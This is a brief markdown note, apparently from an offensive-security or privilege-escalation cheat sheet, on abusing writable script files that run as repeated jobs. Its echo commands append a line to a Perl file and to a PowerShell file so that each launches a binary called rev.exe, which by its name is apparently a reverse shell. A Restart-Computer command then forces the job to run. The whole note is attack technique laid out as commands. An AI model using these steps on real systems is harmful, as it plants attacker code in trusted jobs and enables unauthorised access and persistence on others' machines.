# Job with editable file

This topic created for uncommon editable files with repetetive job.

### Perl file

```
echo. >> backup_perl.pl
echo system("/backup/rev.exe"); >> backup_perl.pl
```

### Powershell file

```
echo. >> backup_powershell.ps1
echo .\rev.exe >> backup_powershell.ps1
```

To get restart machine, you can use this command:

```
powershell Restart-Computer
```
